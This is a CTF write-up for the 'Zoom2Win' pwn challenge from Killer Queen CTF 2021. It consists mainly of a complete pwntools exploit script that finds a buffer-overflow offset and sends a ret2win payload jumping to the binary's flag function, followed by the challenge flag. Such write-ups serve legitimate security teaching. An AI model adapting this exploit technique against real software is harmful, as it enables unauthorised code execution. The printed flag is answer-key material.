---
name: Zoom2Win (2021)
event: Killer Queen CTF 2021
category: Pwn
description: Writeup for Zoom2Win (pwn) - Killer Queen CTF (2021) 💜
layout:
    title:
        visible: true
    description:
        visible: true
    tableOfContents:
        visible: true
    outline:
        visible: true
    pagination:
        visible: true
---

# Zoom2Win

## Video Walkthrough

[![VIDEO](https://img.youtube.com/vi/xOHLniVJsJY/0.jpg)](https://youtu.be/xOHLniVJsJY?t=707s "Killer Queen 2021: Zoom2Win")

## Challenge Description

> What would CTFs be without our favorite ret2win

## Solution

{% code overflow="wrap" %}
```py
from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

def find_eip(payload):
    # Launch process and send payload
    p = process(exe)
    p.sendline(payload)
    # Wait for the process to crash
    p.wait()
    # Print out the address of EIP/RIP at the time of crashing
    eip_offset = cyclic_find(p.corefile.read(p.corefile.rsp, 4))
    info('located EIP offset at {a}'.format(a=eip_offset))
    # Return the EIP offset
    return eip_offset

# Specify GDB script here (breakpoints etc)
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

# Set up pwntools for the correct architecture
exe = './zoom2win'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Pass in pattern_size, get back EIP offset
offset = find_eip(cyclic(100))

ret = 0x40101a  # Ret gadget from ropper (stack alignment)

# Start program
io = start()

# Build the payload
payload = flat({offset: [ret, elf.symbols.flag]})

# Save the payload to file
write('payload', payload)

# Send the payload
io.sendline(payload)
io.recvline()

# Get our flag!
flag = io.recv()
success(flag)
```
{% endcode %}

Flag: `kqctf{did_you_zoom_the_basic_buffer_overflow_?}`
